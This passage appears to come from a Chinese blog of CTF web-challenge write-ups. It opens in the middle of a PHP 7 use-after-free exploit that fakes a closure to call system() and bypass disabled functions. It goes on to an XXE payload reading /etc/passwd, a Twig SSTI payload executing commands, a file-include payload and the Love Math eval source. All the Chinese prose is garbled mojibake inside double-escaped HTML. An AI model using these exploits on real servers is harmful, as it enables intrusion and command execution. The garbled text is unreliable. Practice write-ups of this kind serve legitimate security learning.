gc_collect_cycles();
$v = [];
$v[0] = ptr2str(0, 79);
unset($v);
$abc = $out[2][0];
$helper = new Helper;
$helper-&amp;gt;b = function ($x) { };
if(strlen($abc) == 79 || strlen($abc) == 0) {
die(&amp;#34;UAF failed&amp;#34;);
}
# leaks
$closure_handlers = str2ptr($abc, 0);
$php_heap = str2ptr($abc, 0x58);
$abc_addr = $php_heap - 0xc8;
# fake value
write($abc, 0x60, 2);
write($abc, 0x70, 6);
# fake reference
write($abc, 0x10, $abc_addr + 0x60);
write($abc, 0x18, 0xa);
$closure_obj = str2ptr($abc, 0x20);
$binary_leak = leak($closure_handlers, 8);
if(!($base = get_binary_base($binary_leak))) {
die(&amp;#34;Couldn&amp;#39;t determine binary base address&amp;#34;);
}
if(!($elf = parse_elf($base))) {
die(&amp;#34;Couldn&amp;#39;t parse ELF header&amp;#34;);
}
if(!($basic_funcs = get_basic_funcs($base, $elf))) {
die(&amp;#34;Couldn&amp;#39;t get basic_functions address&amp;#34;);
}
if(!($zif_system = get_system($basic_funcs))) {
die(&amp;#34;Couldn&amp;#39;t get zif_system address&amp;#34;);
}
# fake closure object
$fake_obj_offset = 0xd0;
for($i = 0; $i &amp;lt; 0x110; $i += 8) {
write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
}
# pwn
write($abc, 0x20, $abc_addr + $fake_obj_offset);
write($abc, 0xd0 + 0x38, 1, 4); # internal func type
write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
($helper-&amp;gt;b)($cmd);
exit();
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åœ¨èšå‰‘å¯ä»¥çœ‹å‡ºtmpæ–‡ä»¶å¤¹æƒé™å¯ä»¥ä¸Šä¼ ï¼Œä¸Šä¼ ä»¥åä½¿ç”¨æ–‡ä»¶åŒ…å«è¾“å‡ºæ‰§è¡Œç»“æœã€‚æ–‡ä»¶åŒ…å«payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?Ginkgo=aW5jbHVkZSgnL3RtcC9waHA3LWdjLWJ5cGFzcy5waHAnKTs=
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="0302"&gt;03.02
&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id="nctf2019fake-xml-cookbook"&gt;[NCTF2019]Fake XML cookbook
&lt;/h1&gt;&lt;p&gt;æ ¹æ®é¢˜ç›®æ˜¯XMLï¼Œé¦–å…ˆæƒ³åˆ°æ˜¯XXEï¼Œè™½ç„¶å’±æ²¡å­¦è¿‡ä½†æ˜¯å¯ä»¥å»æœç®€å•çš„payloadã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨bpæŠ“ä¸ªåŒ…ï¼ŒPOSTä¸­ä¼ å…¥çš„æ˜¯æ ‡ç­¾æ ¼å¼ï¼Œå¯ä»¥ç¡®å®šæ˜¯XXEç±»å‹çš„é¢˜ç›®&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;POST
Content-Type: application/xml;
&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;1&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;2&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å»æ‘¸ä¸€ä¸ªpayloadè¯•è¯•&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE test [
&amp;lt;!ENTITY admin SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;
]&amp;gt;
&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;admin;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æˆåŠŸè¯»å–æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302110439.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æŠŠè·¯å¾„æ”¹ä¸º/flagï¼Œè·å¾—flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="asis-2019unicorn-shop"&gt;[ASIS 2019]Unicorn shop
&lt;/h1&gt;&lt;p&gt;è¿™é“é¢˜ç»æ´»ã€‚å­¦åˆ°äº†unicodeçš„å®‰å…¨é—®é¢˜ï¼š&lt;a class="link" href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener"
&gt;æµ…è°ˆUnicodeè®¾è®¡çš„å®‰å…¨æ€§&lt;/a&gt;ï¼Œçœ‹äº†wpã€‚&lt;/p&gt;
&lt;p&gt;è¿›å…¥ç½‘ç«™ä¸€ä¸ªæœ¬æ°æ˜Â·å¯Œå…°å…‹æ—è‡³ç†åè¨€ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;é‡‘é’±ä»æ¥ä¸ä¼šä½¿äººå¹¸ç¦ï¼Œä¹Ÿä¸ä¼šä½¿äººå¹¸ç¦ï¼›å®ƒçš„æœ¬æ€§ä¸­æ²¡æœ‰ä»»ä½•ä¸œè¥¿å¯ä»¥äº§ç”Ÿå¹¸ç¦ã€‚å¹¸ç¦æ‹¥æœ‰çš„è¶Šå¤šï¼Œæƒ³è¦çš„å°±è¶Šå¤š&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;del&gt;å·®ç‚¹ä¿¡äº†ï¼Œæˆ‘å°±è¦èµšé’±èŠ±(å°å£°bb)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹é¢ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œä¸€ä¸ªIDä¸€ä¸ªé’±ï¼Œä¸Šé¢ä¸€ä¸ªç‹¬è§’å…½å•†å“åˆ—è¡¨ï¼Œä¸€çœ‹å°±æ˜¯è®©ä¹°ä¸œè¥¿ï¼Œä½†æ˜¯1-3å•†å“è¾“å…¥IDéƒ½æç¤ºé”™è¯¯ï¼Œåªæœ‰ç¬¬å››ä¸ªå¯ä»¥ä¹°åˆ°ï¼Œä½†æ˜¯ç¬¬å››ä¸ªè¾“å…¥é’±çš„æ—¶å€™åªèƒ½è¾“å…¥1ä½ï¼Œç„¶é¹…4å·ä»·æ ¼æ˜¯1377ï¼Œæ˜¾ç„¶ä¹°ä¸åˆ°ï¼Œè¾“å…¥å¤šä¸ªåˆæç¤º ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯æ‰¾ä¸€ä¸ªunicodeå­—ç¬¦ï¼Œå®ƒçš„æ•°å­—æ ¼å¼å€¼æ˜¯å¤§äº1377çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªå’Œunicodeæœ‰å…³çš„ç½‘ç«™ï¼šhttps://www.compart.com/en/unicode&lt;/p&gt;
&lt;p&gt;ç½‘ç«™å¯¼èˆªæ æ‰¾åˆ°Character Categoriesåˆ†ç±»ï¼Œè¿™ä¸ªä¸‹æœ‰ä¸‰ä¸ªå’Œæ•°ç›¸å…³çš„ï¼šDecimal Numberã€Letter Numberã€Other Numberï¼Œç¬¬ä¸€ä¸ªé‡Œé¢éƒ½æ˜¯æ­£å¸¸æ•°å€¼çš„unicodeï¼Œå»ºè®®å»åé¢ä¸¤ä¸ªæ‰¾ã€‚æ€ä¹ˆæ‰¾ï¼š&lt;code&gt;Ctrl+F&lt;/code&gt;æœç´¢thousandï¼Œæ‰¾1377ä»¥ä¸Šçš„éƒ½å¯ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘é€‰çš„æ˜¯è¿™ä¸ª&lt;code&gt;á¼&lt;/code&gt;æ•°å€¼æ˜¯1wï¼Œç›´æ¥ä¼ ä¼ ä¸è¿‡å»ï¼Œä½¿ç”¨urlç¼–ç ä¸€æ¬¡å†ä¼ ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302113544.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf2020cookie-is-so-stable"&gt;[BJDCTF2020]Cookie is so stable
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210304092035.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜å’ŒThe mystery of ipçš„ç½‘ç«™ä¸€æ ·ï¼Œè¿˜æœ‰å¯èƒ½æ˜¯sstiï¼Œhint.phpçš„æ³¨é‡Šé‡Œæœ‰&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Why not take a closer look at cookies?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å»flag.phpæäº¤ä¸ª1ä¹‹åï¼Œçœ‹cookieä¸º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;Cookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸€ç›®äº†ç„¶ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾payloadã€‚å†ä½¿ç”¨ä¹‹å‰çš„&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;{system(&amp;#39;cat /flag&amp;#39;)}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¢«æ‹¦ä¸‹æ¥äº†ï¼Œè¯´æ˜åŠ å¼ºäº†è¿‡æ»¤ã€‚åœ¨è¿™ä¹‹åå»çœ‹äº†wpï¼Œç½‘ä¸Šçš„wpéƒ½æ˜¯ç›´æ¥ç»™å‡ºäº†payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;{{_self.env.registerUndefinedFilterCallback(&amp;#34;exec&amp;#34;)}}{{_self.env.getFilter(&amp;#34;whoami&amp;#34;)}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æˆ‘æ˜¯å—äº†è¿™ä½å¸ˆå‚…çš„&lt;a class="link" href="https://www.cnblogs.com/bmjoker/p/13508538.html" target="_blank" rel="noopener"
&gt;æ–‡ç« &lt;/a&gt;å¯å‘ï¼Œåˆå»ç»“åˆäº†ä¸‹è¿™é“é¢˜çš„&lt;a class="link" href="https://github.com/BjdsecCA/BJDCTF2020_January/tree/f73ac63336d9161d3c91354ce3eac943c403d4fb/Web/ssti_twig" target="_blank" rel="noopener"
&gt;æºç &lt;/a&gt;æ‰ææ˜ç™½ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜åœ¨æ¸²æŸ“ä¹‹å‰ä½¿ç”¨äº†twigæ¨¡æ¿ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Twigæ˜¯æ¥è‡ªäºSymfonyçš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒéå¸¸æ˜“äºå®‰è£…å’Œä½¿ç”¨ã€‚å®ƒçš„æ“ä½œæœ‰ç‚¹åƒMustacheå’Œliquidã€‚Twigä½¿ç”¨ä¸€ä¸ªåŠ è½½å™¨ loader(Twig_Loader_Array) æ¥å®šä½æ¨¡æ¿ï¼Œä»¥åŠä¸€ä¸ªç¯å¢ƒå˜é‡ environment(Twig_Environment) æ¥å­˜å‚¨é…ç½®ä¿¡æ¯ã€‚å…¶ä¸­ï¼Œrender() æ–¹æ³•é€šè¿‡å…¶ç¬¬ä¸€ä¸ªå‚æ•°è½½å…¥æ¨¡æ¿ï¼Œå¹¶é€šè¿‡ç¬¬äºŒä¸ªå‚æ•°ä¸­çš„å˜é‡æ¥æ¸²æŸ“æ¨¡æ¿ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;æˆ‘åŒæ ·åœ¨é¢˜ç›®çš„æºç ä¸­æ‰¾åˆ°äº†&lt;code&gt;render()&lt;/code&gt;æ–¹æ³•å’Œ&lt;code&gt;Twig_Environment&lt;/code&gt;é…ç½®ä¿¡æ¯&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302160322.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åpayloadçš„å…·ä½“åŸç†åœ¨çš„&lt;code&gt;Environment.php&lt;/code&gt;ä¸­,è´´ä¸€ä¸‹å’Œpayloadç›¸å…³éƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302160722.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å…ˆæ‰§è¡Œ&lt;code&gt;{{_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)}}&lt;/code&gt;è°ƒç”¨äº†&lt;code&gt;registerUndefinedFilterCallback()&lt;/code&gt;å‡½æ•°(å›¾ä¸­884è¡Œ)ï¼Œæ³¨å†Œäº†ä¸€ä¸ªæœªå®šä¹‰çš„å‡½æ•°åˆ°&lt;code&gt;filterCallbacks&lt;/code&gt;å…¨å±€å˜é‡ä¸­&lt;/li&gt;
&lt;li&gt;æ¥ç€æ‰§è¡Œ&lt;code&gt;{{_self.env.getFilter(&amp;quot;whoami&amp;quot;)}}&lt;/code&gt;è°ƒç”¨äº†&lt;code&gt;getFilter()&lt;/code&gt;å‡½æ•°ï¼Œå¹¶ä¼ å…¥å˜é‡&lt;code&gt;$name&lt;/code&gt;å€¼ä¸ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œå½“å‡½æ•°æ‰§è¡Œåˆ°å›¾ä¸­ä»£ç 875è¡Œæ—¶ï¼Œè¿›å…¥å¾ªç¯æ‰§è¡Œäº†&lt;code&gt;call_user_func()&lt;/code&gt;ï¼Œè¿™ä¸ªå‡½æ•°å¤§ä¼™è‚¯å®šä¸é™Œç”Ÿï¼šcall_user_func å¯ä»¥æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ï¼Œè°ƒç”¨çš„å‚æ•°æ¥æºå°±æ˜¯ç¬¬ä¸€æ­¥ä¸­æ³¨å†Œçš„&lt;code&gt;filterCallbacks&lt;/code&gt;å…¨å±€å˜é‡ï¼Œé‡Œè¾¹å·²ç»èººå¥½äº†ä¸€ä¸ªåˆšåˆšæ³¨å†Œçš„&lt;code&gt;exec&lt;/code&gt;ï¼Œè‡³æ­¤å°±å½¢æˆäº†payload&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1 id="å°å½©è›‹"&gt;å°å½©è›‹
&lt;/h1&gt;&lt;p&gt;ç°åœ¨(2021å¹´3æœˆ2æ—¥16:32:44)åˆšå¥½åšå®Œé¢˜ï¼Œæƒ³å›åˆ°BUUä¸Šæ•´ç†è¿‡ç¨‹ï¼Œå‘ç°502äº†ï¼Œç„¶åå»ç¾¤é‡Œå°±çœ‹åˆ°äº†&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302163452.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302163636.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æŒºè‰çš„è®°ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="ciscn-2019-åˆèµ›love-math"&gt;[CISCN 2019 åˆèµ›]Love Math
&lt;/h1&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;show_source&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//ä¾‹å­ c=20-1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $content &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($content) &lt;span style="color:#f92672"&gt;&amp;gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;80&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;å¤ªé•¿äº†ä¸ä¼šç®—&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $blacklist &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39; &amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\t&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;`&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\[&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\]&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;foreach&lt;/span&gt; ($blacklist &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; $blackitem) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $blackitem &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/m&amp;#39;&lt;/span&gt;, $content)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $whitelist &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;abs&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan2&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atanh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;base_convert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;bindec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;ceil&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decbin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;dechex&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decoct&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;deg2rad&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;expm1&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;floor&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;fmod&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hexdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hypot&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_finite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_infinite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_nan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;lcg_value&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log10&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log1p&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;max&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;min&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;octdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pi&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pow&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rad2deg&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;round&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sqrt&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tanh&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;preg_match_all&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&amp;#39;&lt;/span&gt;, $content, $used_funcs);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;foreach&lt;/span&gt; ($used_funcs[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;] &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; $func) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($func, $whitelist)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//å¸®ä½ ç®—å‡ºç­”æ¡ˆ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;eval&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;echo &amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$content&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¿«è¢«ææ­»äº†ï¼Œæ˜¯ä¸€é“æœ‰è¿‡æ»¤é™åˆ¶çš„RCEï¼ŒåŠå¤©æ²¡æœ‰å¤´ç»ªå°±å»çœ‹wpäº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.cnblogs.com/20175211lyz/p/11588219.html" target="_blank" rel="noopener"
&gt;åˆ·é¢˜è®°å½•ï¼š[CISCN 2019 åˆèµ›]Love Math&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æœ€åè‡ªå·±ç¢ç£¨å‡ºæ¥äº†ä¸€ä¸ªpayloadï¼Œæ€è·¯å½“ç„¶è¿˜æ˜¯å‚è€ƒä¸Šé¢å¸ˆå‚…åšå®¢çš„ã€‚&lt;/p&gt;
&lt;p&gt;åˆ©ç”¨&lt;code&gt;$whitelist&lt;/code&gt;é‡Œçš„å‡½æ•°åç§°å’Œæ•°å­—éå†å¼‚æˆ–&lt;code&gt;^&lt;/code&gt;ï¼ŒFuzzæ‰¾å‡ºæ¥éœ€è¦çš„å­—æ¯ï¼Œç„¶åæ‹¼æ¥ä¸€ä¸ª&lt;code&gt;_GET&lt;/code&gt;ä¼ å‚æ‰§è¡Œå‘½ä»¤ã€‚&lt;/p&gt;
